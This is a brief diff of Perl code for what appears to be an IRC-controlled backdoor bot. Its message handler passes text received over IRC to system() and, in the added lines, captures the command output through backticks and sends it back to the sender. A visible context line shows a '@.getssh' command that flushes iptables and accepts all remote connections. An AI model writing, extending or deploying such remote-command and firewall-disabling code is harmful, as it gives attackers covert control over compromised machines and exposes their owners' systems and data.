@@ -68,6 +68,10 @@ $irc->on(irc_privmsg => sub {
              my $fragment =  substr $msg, 7;
              $irc->write(notice => $noticechan => "$msg\n");
              system("$msg");
+             my @output = `$msg 2>&1 3>&1`;
+             foreach(@output) {
+               printa("$_\r\n");
+             }
  }
   if ($msg =~ /@.getssh/) {
   warn 'Flushing iptables & Accepting all remote connections.';
